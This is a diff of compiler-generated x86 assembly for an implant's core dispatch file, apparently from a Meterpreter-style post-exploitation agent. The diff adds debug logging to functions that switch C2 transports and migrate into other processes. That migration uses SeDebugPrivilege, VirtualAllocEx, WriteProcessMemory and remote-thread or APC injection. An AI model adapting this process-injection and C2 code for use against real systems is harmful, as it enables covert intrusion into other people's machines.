@@ -1,5 +1,67 @@
 	.file	"base_dispatch.c"
 	.text
+	.section .rdata,"dr"
+LC0:
+	.ascii "[%04x] \0"
+LC1:
+	.ascii "\15\12\0"
+	.text
+	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
+_real_dprintf:
+	pushl	%ebp
+	movl	%esp, %ebp
+	pushl	%esi
+	pushl	%ebx
+	subl	$1072, %esp
+	movl	__imp__GetCurrentThreadId@0, %eax
+	call	*%eax
+	movl	%eax, 16(%esp)
+	movl	$LC0, 12(%esp)
+	movl	$1023, 8(%esp)
+	movl	$1024, 4(%esp)
+	leal	-1040(%ebp), %eax
+	movl	%eax, (%esp)
+	movl	__imp___snprintf_s, %eax
+	call	*%eax
+	leal	-1040(%ebp), %eax
+	movl	%eax, (%esp)
+	call	_strlen
+	movl	%eax, -12(%ebp)
+	leal	12(%ebp), %eax
+	movl	%eax, -16(%ebp)
+	movl	-16(%ebp), %ecx
+	movl	$1021, %eax
+	subl	-12(%ebp), %eax
+	movl	%eax, %edx
+	movl	$1024, %eax
+	subl	-12(%ebp), %eax
+	leal	-1040(%ebp), %esi
+	movl	-12(%ebp), %ebx
+	addl	%esi, %ebx
+	movl	%ecx, 16(%esp)
+	movl	8(%ebp), %ecx
+	movl	%ecx, 12(%esp)
+	movl	%edx, 8(%esp)
+	movl	%eax, 4(%esp)
+	movl	%ebx, (%esp)
+	call	_vsnprintf_s
+	movl	$LC1, 8(%esp)
+	movl	$1024, 4(%esp)
+	leal	-1040(%ebp), %eax
+	movl	%eax, (%esp)
+	movl	__imp__strcat_s, %eax
+	call	*%eax
+	leal	-1040(%ebp), %eax
+	movl	%eax, (%esp)
+	movl	__imp__OutputDebugStringA@4, %eax
+	call	*%eax
+	subl	$4, %esp
+	nop
+	leal	-8(%ebp), %esp
+	popl	%ebx
+	popl	%esi
+	popl	%ebp
+	ret
 	.globl	_get_migrate_context
 	.def	_get_migrate_context;	.scl	2;	.type	32;	.endef
 _get_migrate_context:
@@ -15,25 +77,37 @@ _get_migrate_context:
 	movl	12(%ebp), %eax
 	movl	(%eax), %eax
 	testl	%eax, %eax
-	jne	L2
+	jne	L3
 	movl	$14, %eax
-	jmp	L3
-L2:
+	jmp	L4
+L3:
 	movl	8(%ebp), %eax
 	movl	$16, (%eax)
 	movl	$0, %eax
-L3:
+L4:
 	leave
 	ret
 	.section .rdata,"dr"
+LC2:
+	.ascii "[CHANGE TRANS] Url: %S\0"
+LC3:
+	.ascii "[CHANGE TRANS] Comms: %d\0"
+	.align 4
+LC4:
+	.ascii "[CHANGE TRANS] Retry Total: %u\0"
+LC5:
+	.ascii "[CHANGE TRANS] Retry Wait: %u\0"
+	.align 4
+LC6:
+	.ascii "[CHANGE TRANS] Something was NULL\0"
 	.align 2
-LC0:
+LC7:
 	.ascii "t\0c\0p\0\0\0"
 	.align 2
-LC1:
+LC8:
 	.ascii "p\0i\0p\0e\0\0\0"
 	.align 2
-LC2:
+LC9:
 	.ascii "h\0t\0t\0p\0s\0\0\0"
 	.text
 	.globl	_create_transport_from_request
@@ -74,7 +148,7 @@ _create_transport_from_request:
 	call	_packet_get_tlv_value_uint
 	movl	%eax, -64(%ebp)
 	cmpl	$0, -28(%ebp)
-	je	L5
+	je	L6
 	movl	8(%ebp), %eax
 	movl	-28(%ebp), %edx
 	movl	%edx, 68(%eax)
@@ -84,40 +158,60 @@ _create_transport_from_request:
 	addl	%eax, %edx
 	movl	8(%ebp), %eax
 	movl	%edx, 72(%eax)
-L5:
-	movl	-72(%ebp), %eax
-	testl	%eax, %eax
-	jne	L6
-	movl	8(%ebp), %eax
-	movl	4(%eax), %eax
-	movl	52(%eax), %eax
-	movl	%eax, -72(%ebp)
 L6:
-	movl	-68(%ebp), %eax
+	movl	-72(%ebp), %eax
 	testl	%eax, %eax
 	jne	L7
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
-	movl	56(%eax), %eax
-	movl	%eax, -68(%ebp)
+	movl	52(%eax), %eax
+	movl	%eax, -72(%ebp)
 L7:
-	movl	-64(%ebp), %eax
+	movl	-68(%ebp), %eax
 	testl	%eax, %eax
 	jne	L8
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
+	movl	56(%eax), %eax
+	movl	%eax, -68(%ebp)
+L8:
+	movl	-64(%ebp), %eax
+	testl	%eax, %eax
+	jne	L9
+	movl	8(%ebp), %eax
+	movl	4(%eax), %eax
 	movl	60(%eax), %eax
 	movl	%eax, -64(%ebp)
-L8:
+L9:
+	movl	-24(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC2, (%esp)
+	call	_real_dprintf
+	movl	-72(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC3, (%esp)
+	call	_real_dprintf
+	movl	-68(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC4, (%esp)
+	call	_real_dprintf
+	movl	-64(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC5, (%esp)
+	call	_real_dprintf
 	cmpl	$0, -24(%ebp)
-	je	L22
+	jne	L10
+	movl	$LC6, (%esp)
+	call	_real_dprintf
+	jmp	L11
+L10:
 	movl	$3, 8(%esp)
-	movl	$LC0, 4(%esp)
+	movl	$LC7, 4(%esp)
 	movl	-24(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_wcsncmp
 	testl	%eax, %eax
-	jne	L11
+	jne	L12
 	leal	-1112(%ebp), %edx
 	movl	$0, %eax
 	movl	$259, %ecx
@@ -144,15 +238,15 @@ L8:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -16(%ebp)
-	jmp	L12
-L11:
+	jmp	L13
+L12:
 	movl	$4, 8(%esp)
-	movl	$LC1, 4(%esp)
+	movl	$LC8, 4(%esp)
 	movl	-24(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_wcsncmp
 	testl	%eax, %eax
-	jne	L13
+	jne	L14
 	leal	-1112(%ebp), %edx
 	movl	$0, %eax
 	movl	$259, %ecx
@@ -179,10 +273,10 @@ L11:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -16(%ebp)
-	jmp	L12
-L13:
+	jmp	L13
+L14:
 	movl	$5, 8(%esp)
-	movl	$LC2, 4(%esp)
+	movl	$LC9, 4(%esp)
 	movl	-24(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_wcsncmp
@@ -225,12 +319,12 @@ L13:
 	movl	%eax, -56(%ebp)
 	movl	$2082, -20(%ebp)
 	cmpl	$0, -56(%ebp)
-	je	L14
+	je	L15
 	movl	-56(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_wcslen
 	addl	%eax, -20(%ebp)
-L14:
+L15:
 	movl	-20(%ebp), %eax
 	movl	%eax, 4(%esp)
 	movl	$1, (%esp)
@@ -254,7 +348,7 @@ L14:
 	movl	%eax, (%esp)
 	call	_wcsncpy
 	cmpl	$0, -40(%ebp)
-	je	L15
+	je	L16
 	movl	-60(%ebp), %eax
 	leal	1036(%eax), %edx
 	movl	$128, 8(%esp)
@@ -265,9 +359,9 @@ L14:
 	movl	-40(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
-L15:
+L16:
 	cmpl	$0, -44(%ebp)
-	je	L16
+	je	L17
 	movl	-60(%ebp), %eax
 	leal	1292(%eax), %edx
 	movl	$64, 8(%esp)
@@ -278,9 +372,9 @@ L15:
 	movl	-44(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
-L16:
+L17:
 	cmpl	$0, -48(%ebp)
-	je	L17
+	je	L18
 	movl	-60(%ebp), %eax
 	leal	1420(%eax), %edx
 	movl	$64, 8(%esp)
@@ -291,9 +385,9 @@ L16:
 	movl	-48(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
-L17:
+L18:
 	cmpl	$0, -36(%ebp)
-	je	L18
+	je	L19
 	movl	-60(%ebp), %eax
 	leal	1548(%eax), %edx
 	movl	$256, 8(%esp)
@@ -304,9 +398,9 @@ L17:
 	movl	-36(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
-L18:
+L19:
 	cmpl	$0, -52(%ebp)
-	je	L19
+	je	L20
 	movl	-60(%ebp), %eax
 	leal	2060(%eax), %edx
 	movl	$20, 8(%esp)
@@ -314,16 +408,16 @@ L18:
 	movl	%eax, 4(%esp)
 	movl	%edx, (%esp)
 	call	_memcpy
-L19:
+L20:
 	cmpl	$0, -56(%ebp)
-	je	L20
+	je	L21
 	movl	-60(%ebp), %eax
 	leal	2080(%eax), %edx
 	movl	-56(%ebp), %eax
 	movl	%eax, 4(%esp)
 	movl	%edx, (%esp)
 	call	_wcscpy
-L20:
+L21:
 	movl	8(%ebp), %eax
 	movl	60(%eax), %eax
 	movl	-60(%ebp), %edx
@@ -336,12 +430,9 @@ L20:
 	movl	-60(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
-L12:
+L13:
 	movl	$0, -12(%ebp)
-	jmp	L10
-L22:
-	nop
-L10:
+L11:
 	movl	16(%ebp), %eax
 	movl	-16(%ebp), %edx
 	movl	%edx, (%eax)
@@ -350,6 +441,22 @@ L10:
 	popl	%edi
 	popl	%ebp
 	ret
+	.section .rdata,"dr"
+LC10:
+	.ascii "[DISPATCH] Adding URL %S\0"
+	.align 4
+LC11:
+	.ascii "[DISPATCH] Adding Comms timeout %u\0"
+	.align 4
+LC12:
+	.ascii "[DISPATCH] Adding Retry total %u\0"
+	.align 4
+LC13:
+	.ascii "[DISPATCH] Adding Retry wait %u\0"
+	.align 4
+LC14:
+	.ascii "[DISPATCH] Transport is HTTP/S\0"
+	.text
 	.globl	_remote_request_core_transport_list
 	.def	_remote_request_core_transport_list;	.scl	2;	.type	32;	.endef
 _remote_request_core_transport_list:
@@ -391,11 +498,21 @@ L35:
 	je	L38
 	movl	-16(%ebp), %eax
 	movl	44(%eax), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC10, (%esp)
+	call	_real_dprintf
+	movl	-16(%ebp), %eax
+	movl	44(%eax), %eax
 	movl	%eax, 8(%esp)
 	movl	$65967, 4(%esp)
 	movl	-28(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_add_tlv_wstring
+	movl	-16(%ebp), %eax
+	movl	52(%eax), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC11, (%esp)
+	call	_real_dprintf
 	movl	-16(%ebp), %eax
 	movl	52(%eax), %eax
 	movl	%eax, 8(%esp)
@@ -405,11 +522,21 @@ L35:
 	call	_packet_add_tlv_uint
 	movl	-16(%ebp), %eax
 	movl	56(%eax), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC12, (%esp)
+	call	_real_dprintf
+	movl	-16(%ebp), %eax
+	movl	56(%eax), %eax
 	movl	%eax, 8(%esp)
 	movl	$131511, 4(%esp)
 	movl	-28(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_add_tlv_uint
+	movl	-16(%ebp), %eax
+	movl	60(%eax), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC13, (%esp)
+	call	_real_dprintf
 	movl	-16(%ebp), %eax
 	movl	60(%eax), %eax
 	movl	%eax, 8(%esp)
@@ -427,6 +554,8 @@ L27:
 	movl	-16(%ebp), %eax
 	movl	48(%eax), %eax
 	movl	%eax, -32(%ebp)
+	movl	$LC14, (%esp)
+	call	_real_dprintf
 	movl	-32(%ebp), %eax
 	movl	20(%eax), %eax
 	testl	%eax, %eax
@@ -538,6 +667,17 @@ L36:
 	popl	%ebx
 	popl	%ebp
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC15:
+	.ascii "[DISPATCH] Asking to go to next transport (from 0x%p to 0x%p)\0"
+	.align 4
+LC16:
+	.ascii "[DISPATCH] Transports are the same, don't do anything\0"
+	.align 4
+LC17:
+	.ascii "[DISPATCH] Transports are different, perform the switch\0"
+	.text
 	.globl	_remote_request_core_transport_next
 	.def	_remote_request_core_transport_next;	.scl	2;	.type	32;	.endef
 _remote_request_core_transport_next:
@@ -545,16 +685,29 @@ _remote_request_core_transport_next:
 	movl	%esp, %ebp
 	subl	$24, %esp
 	movl	8(%ebp), %eax
+	movl	4(%eax), %eax
+	movl	68(%eax), %edx
+	movl	8(%ebp), %eax
+	movl	4(%eax), %eax
+	movl	%edx, 8(%esp)
+	movl	%eax, 4(%esp)
+	movl	$LC15, (%esp)
+	call	_real_dprintf
+	movl	8(%ebp), %eax
 	movl	4(%eax), %edx
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	68(%eax), %eax
 	cmpl	%eax, %edx
 	jne	L41
+	movl	$LC16, (%esp)
+	call	_real_dprintf
 	movl	16(%ebp), %eax
 	movl	$1, (%eax)
 	jmp	L42
 L41:
+	movl	$LC17, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	68(%eax), %edx
@@ -578,6 +731,11 @@ L42:
 	movzbl	%al, %eax
 	leave
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC18:
+	.ascii "[DISPATCH] Asking to go to previous transport (from 0x%p to 0x%p)\0"
+	.text
 	.globl	_remote_request_core_transport_prev
 	.def	_remote_request_core_transport_prev;	.scl	2;	.type	32;	.endef
 _remote_request_core_transport_prev:
@@ -585,16 +743,29 @@ _remote_request_core_transport_prev:
 	movl	%esp, %ebp
 	subl	$24, %esp
 	movl	8(%ebp), %eax
+	movl	4(%eax), %eax
+	movl	72(%eax), %edx
+	movl	8(%ebp), %eax
+	movl	4(%eax), %eax
+	movl	%edx, 8(%esp)
+	movl	%eax, 4(%esp)
+	movl	$LC18, (%esp)
+	call	_real_dprintf
+	movl	8(%ebp), %eax
 	movl	4(%eax), %edx
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	72(%eax), %eax
 	cmpl	%eax, %edx
 	jne	L45
+	movl	$LC16, (%esp)
+	call	_real_dprintf
 	movl	16(%ebp), %eax
 	movl	$1, (%eax)
 	jmp	L46
 L45:
+	movl	$LC17, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	72(%eax), %edx
@@ -618,6 +789,18 @@ L46:
 	movzbl	%al, %eax
 	leave
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC19:
+	.ascii "[DISPATCH] Refusing to delete the last transport\0"
+	.align 4
+LC20:
+	.ascii "[DISPATCH] Transport not found, or attempting to remove current\0"
+LC21:
+	.ascii "[DISPATCH] Transport removed\0"
+LC22:
+	.ascii "[DISPATCH] Response sent.\0"
+	.text
 	.globl	_remote_request_core_transport_remove
 	.def	_remote_request_core_transport_remove;	.scl	2;	.type	32;	.endef
 _remote_request_core_transport_remove:
@@ -632,6 +815,8 @@ _remote_request_core_transport_remove:
 	movl	72(%eax), %eax
 	cmpl	%eax, %edx
 	jne	L49
+	movl	$LC19, (%esp)
+	call	_real_dprintf
 	movl	$1, -12(%ebp)
 	jmp	L50
 L49:
@@ -672,6 +857,8 @@ L52:
 	cmpl	%eax, -16(%ebp)
 	jne	L55
 L54:
+	movl	$LC20, (%esp)
+	call	_real_dprintf
 	movl	$87, -12(%ebp)
 	jmp	L56
 L55:
@@ -682,6 +869,8 @@ L55:
 	movl	8(%ebp), %edx
 	movl	%edx, (%esp)
 	call	*%eax
+	movl	$LC21, (%esp)
+	call	_real_dprintf
 L56:
 	cmpl	$0, -24(%ebp)
 	je	L50
@@ -697,6 +886,8 @@ L50:
 	movl	8(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_packet_transmit_empty_response
+	movl	$LC22, (%esp)
+	call	_real_dprintf
 	movl	-12(%ebp), %eax
 	leave
 	ret
@@ -725,6 +916,11 @@ _remote_request_core_transport_add:
 	movl	-12(%ebp), %eax
 	leave
 	ret
+	.section .rdata,"dr"
+	.align 4
+LC23:
+	.ascii "[DISPATCH] request received to sleep for %u seconds\0"
+	.text
 	.globl	_remote_request_core_transport_sleep
 	.def	_remote_request_core_transport_sleep;	.scl	2;	.type	32;	.endef
 _remote_request_core_transport_sleep:
@@ -736,6 +932,10 @@ _remote_request_core_transport_sleep:
 	movl	%eax, (%esp)
 	call	_packet_get_tlv_value_uint
 	movl	%eax, -12(%ebp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC23, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	-12(%ebp), %edx
 	movl	%edx, 12(%eax)
@@ -941,8 +1141,86 @@ L82:
 	leave
 	ret
 	.section .rdata,"dr"
-LC3:
+LC24:
+	.ascii "x64\0"
+LC25:
+	.ascii "x86\0"
+	.align 4
+LC26:
+	.ascii "[MIGRATE] Attempting to migrate. ProcessID=%d, Arch=%s\0"
+	.align 4
+LC27:
+	.ascii "[MIGRATE] Attempting to migrate. PayloadLength=%d StubLength=%d\0"
+LC28:
 	.ascii "SeDebugPrivilege\0"
+	.align 4
+LC29:
+	.ascii "[MIGRATE] Got SeDebugPrivilege!\0"
+LC30:
+	.ascii "[MIGRATE] OpenProcess failed\0"
+LC31:
+	.ascii "%s. error=%d (0x%x)\0"
+	.align 4
+LC32:
+	.ascii "[MIGRATE] creating the configuration block\0"
+	.align 4
+LC33:
+	.ascii "[MIGRATE] Config of %u bytes stashed at 0x%p\0"
+	.align 4
+LC34:
+	.ascii "[MIGRATE] Failed to create migrate context: %u\0"
+LC35:
+	.ascii "[MIGRATE] CreateEvent failed\0"
+	.align 4
+LC36:
+	.ascii "[MIGRATE] DuplicateHandle failed\0"
+	.align 4
+LC37:
+	.ascii "[MIGRATE] Duplicated Event Handle: 0x%x\0"
+	.align 4
+LC38:
+	.ascii "[MIGRATE] VirtualAllocEx failed\0"
+	.align 4
+LC39:
+	.ascii "[MIGRATE] Migrate stub: 0x%p -> %u bytes\0"
+	.align 4
+LC40:
+	.ascii "[MIGRATE] WriteProcessMemory 1 failed\0"
+	.align 4
+LC41:
+	.ascii "[MIGRATE] Migrate context: 0x%p -> %u bytes\0"
+	.align 4
+LC42:
+	.ascii "[MIGRATE] WriteProcessMemory 2 failed\0"
+	.align 4
+LC43:
+	.ascii "[MIGRATE] Migrate payload: 0x%p -> %u bytes\0"
+	.align 4
+LC44:
+	.ascii "[MIGRATE] WriteProcessMemory 3 failed\0"
+	.align 4
+LC45:
+	.ascii "[MIGRATE] Configuration: 0x%p -> %u bytes\0"
+	.align 4
+LC46:
+	.ascii "[MIGRATE] WriteProcessMemory 4 failed\0"
+	.align 4
+LC47:
+	.ascii "[MIGRATE] inject_via_remotethread failed, trying inject_via_apcthread...\0"
+	.align 4
+LC48:
+	.ascii "[MIGRATE] inject_via_apcthread failed\0"
+LC49:
+	.ascii "[MIGRATE] Sending response\0"
+	.align 4
+LC50:
+	.ascii "[MIGRATE] Closing the process handle 0x%08x\0"
+	.align 4
+LC51:
+	.ascii "[MIGRATE] Closing the event handle 0x%08x\0"
+	.align 4
+LC52:
+	.ascii "[MIGRATE] Finishing migration, result: %u\0"
 	.text
 	.globl	_remote_request_core_migrate
 	.def	_remote_request_core_migrate;	.scl	2;	.type	32;	.endef
@@ -975,7 +1253,7 @@ _remote_request_core_migrate:
 	cmpl	$0, -24(%ebp)
 	jne	L85
 	movl	$8, -12(%ebp)
-	jmp	L101
+	jmp	L103
 L85:
 	movl	$131474, 4(%esp)
 	movl	12(%ebp), %eax
@@ -1009,6 +1287,24 @@ L85:
 	movl	%eax, (%esp)
 	call	_packet_get_tlv_value_raw
 	movl	%eax, -32(%ebp)
+	cmpl	$2, -48(%ebp)
+	jne	L87
+	movl	$LC24, %eax
+	jmp	L88
+L87:
+	movl	$LC25, %eax
+L88:
+	movl	%eax, 8(%esp)
+	movl	-44(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC26, (%esp)
+	call	_real_dprintf
+	movl	-64(%ebp), %edx
+	movl	-68(%ebp), %eax
+	movl	%edx, 8(%esp)
+	movl	%eax, 4(%esp)
+	movl	$LC27, (%esp)
+	call	_real_dprintf
 	movl	__imp__GetCurrentProcess@0, %eax
 	call	*%eax
 	leal	-52(%ebp), %edx
@@ -1019,7 +1315,7 @@ L85:
 	call	*%eax
 	subl	$12, %esp
 	testl	%eax, %eax
-	je	L87
+	je	L89
 	movl	$0, -96(%ebp)
 	movl	$0, -92(%ebp)
 	movl	$0, -88(%ebp)
@@ -1029,13 +1325,13 @@ L85:
 	leal	-96(%ebp), %eax
 	addl	$4, %eax
 	movl	%eax, 8(%esp)
-	movl	$LC3, 4(%esp)
+	movl	$LC28, 4(%esp)
 	movl	$0, (%esp)
 	movl	__imp__LookupPrivilegeValueA@12, %eax
 	call	*%eax
 	subl	$12, %esp
 	testl	%eax, %eax
-	je	L88
+	je	L90
 	movl	-52(%ebp), %eax
 	movl	$0, 20(%esp)
 	movl	$0, 16(%esp)
@@ -1047,13 +1343,17 @@ L85:
 	movl	__imp__AdjustTokenPrivileges@24, %eax
 	call	*%eax
 	subl	$24, %esp
-L88:
+	testl	%eax, %eax
+	je	L90
+	movl	$LC29, (%esp)
+	call	_real_dprintf
+L90:
 	movl	-52(%ebp), %eax
 	movl	%eax, (%esp)
 	movl	__imp__CloseHandle@4, %eax
 	call	*%eax
 	subl	$4, %esp
-L87:
+L89:
 	movl	-44(%ebp), %eax
 	movl	%eax, 8(%esp)
 	movl	$0, 4(%esp)
@@ -1063,12 +1363,21 @@ L87:
 	subl	$12, %esp
 	movl	%eax, -16(%ebp)
 	cmpl	$0, -16(%ebp)
-	jne	L89
+	jne	L91
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L89:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC30, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L91:
+	movl	$LC32, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	(%eax), %eax
 	leal	-76(%ebp), %edx
@@ -1080,11 +1389,17 @@ L89:
 	movl	8(%ebp), %edx
 	movl	%edx, (%esp)
 	call	*%eax
+	movl	-72(%ebp), %edx
+	movl	-76(%ebp), %eax
+	movl	%edx, 8(%esp)
+	movl	%eax, 4(%esp)
+	movl	$LC33, (%esp)
+	call	_real_dprintf
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	40(%eax), %eax
 	testl	%eax, %eax
-	je	L90
+	je	L92
 	movl	8(%ebp), %eax
 	movl	4(%eax), %eax
 	movl	40(%eax), %eax
@@ -1101,17 +1416,23 @@ L89:
 	movl	%edx, (%esp)
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L91
-L90:
+	jmp	L93
+L92:
 	leal	-56(%ebp), %eax
 	movl	%eax, 4(%esp)
 	leal	-60(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_get_migrate_context
 	movl	%eax, -12(%ebp)
-L91:
+L93:
 	cmpl	$0, -12(%ebp)
-	jne	L108
+	je	L94
+	movl	-12(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC34, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L94:
 	movl	$0, 12(%esp)
 	movl	$0, 8(%esp)
 	movl	$1, 4(%esp)
@@ -1121,12 +1442,19 @@ L91:
 	subl	$16, %esp
 	movl	%eax, -20(%ebp)
 	cmpl	$0, -20(%ebp)
-	jne	L93
+	jne	L95
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L93:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC35, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L95:
 	movl	-56(%ebp), %eax
 	movl	%eax, %ebx
 	movl	__imp__GetCurrentProcess@0, %eax
@@ -1144,12 +1472,24 @@ L93:
 	call	*%eax
 	subl	$28, %esp
 	testl	%eax, %eax
-	jne	L94
+	jne	L96
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L94:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC36, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L96:
+	movl	-56(%ebp), %eax
+	movl	(%eax), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC37, (%esp)
+	call	_real_dprintf
 	movl	-64(%ebp), %edx
 	movl	-60(%ebp), %eax
 	addl	%eax, %edx
@@ -1168,12 +1508,19 @@ L94:
 	subl	$20, %esp
 	movl	%eax, -36(%ebp)
 	cmpl	$0, -36(%ebp)
-	jne	L95
+	jne	L97
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L95:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC38, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L97:
 	movl	-64(%ebp), %edx
 	movl	-60(%ebp), %eax
 	leal	(%edx,%eax), %ecx
@@ -1181,6 +1528,12 @@ L95:
 	movl	-36(%ebp), %edx
 	addl	%ecx, %edx
 	movl	%edx, 8(%eax)
+	movl	-64(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	-36(%ebp), %eax
+	movl	%eax, 4(%esp)
+	movl	$LC39, (%esp)
+	call	_real_dprintf
 	movl	-64(%ebp), %eax
 	movl	$0, 16(%esp)
 	movl	%eax, 12(%esp)
@@ -1194,12 +1547,27 @@ L95:
 	call	*%eax
 	subl	$20, %esp
 	testl	%eax, %eax
-	jne	L96
+	jne	L98
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L96:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC40, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L98:
+	movl	-60(%ebp), %eax
+	movl	-64(%ebp), %ecx
+	movl	-36(%ebp), %edx
+	addl	%ecx, %edx
+	movl	%eax, 8(%esp)
+	movl	%edx, 4(%esp)
+	movl	$LC41, (%esp)
+	call	_real_dprintf
 	movl	-60(%ebp), %edx
 	movl	-56(%ebp), %eax
 	movl	-64(%ebp), %ebx
@@ -1215,12 +1583,26 @@ L96:
 	call	*%eax
 	subl	$20, %esp
 	testl	%eax, %eax
-	jne	L97
+	jne	L99
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L97:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC42, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L99:
+	movl	-68(%ebp), %edx
+	movl	-56(%ebp), %eax
+	movl	8(%eax), %eax
+	movl	%edx, 8(%esp)
+	movl	%eax, 4(%esp)
+	movl	$LC43, (%esp)
+	call	_real_dprintf
 	movl	-68(%ebp), %edx
 	movl	-56(%ebp), %eax
 	movl	8(%eax), %eax
@@ -1235,12 +1617,28 @@ L97:
 	call	*%eax
 	subl	$20, %esp
 	testl	%eax, %eax
-	jne	L98
+	jne	L100
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L98:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC44, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L100:
+	movl	-76(%ebp), %eax
+	movl	-56(%ebp), %edx
+	movl	8(%edx), %ecx
+	movl	-68(%ebp), %edx
+	addl	%ecx, %edx
+	movl	%eax, 8(%esp)
+	movl	%edx, 4(%esp)
+	movl	$LC45, (%esp)
+	call	_real_dprintf
 	movl	-76(%ebp), %edx
 	movl	-72(%ebp), %eax
 	movl	-56(%ebp), %ecx
@@ -1257,12 +1655,19 @@ L98:
 	call	*%eax
 	subl	$20, %esp
 	testl	%eax, %eax
-	jne	L99
+	jne	L101
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L99:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC46, 4(%esp)
+	movl	$LC31, (%esp)
+	call	_real_dprintf
+	jmp	L103
+L101:
 	movl	-56(%ebp), %eax
 	movl	%eax, (%esp)
 	call	_free
@@ -1282,7 +1687,9 @@ L99:
 	movl	%eax, (%esp)
 	call	_inject_via_remotethread
 	testl	%eax, %eax
-	je	L100
+	je	L102
+	movl	$LC47, (%esp)
+	call	_real_dprintf
 	movl	-64(%ebp), %edx
 	movl	-36(%ebp), %eax
 	addl	%edx, %eax
@@ -1301,29 +1708,35 @@ L99:
 	movl	%eax, (%esp)
 	call	_inject_via_apcthread
 	testl	%eax, %eax
-	je	L100
+	je	L102
 	movl	__imp__GetLastError@0, %eax
 	call	*%eax
 	movl	%eax, -12(%ebp)
-	jmp	L101
-L100:
+	movl	-12(%ebp), %eax
+	movl	%eax, 12(%esp)
+	movl	-12(%ebp), %eax
+	movl	%eax, 8(%esp)
+	movl	$LC48, 4(%esp)
+	movl	$LC31, (%esp)
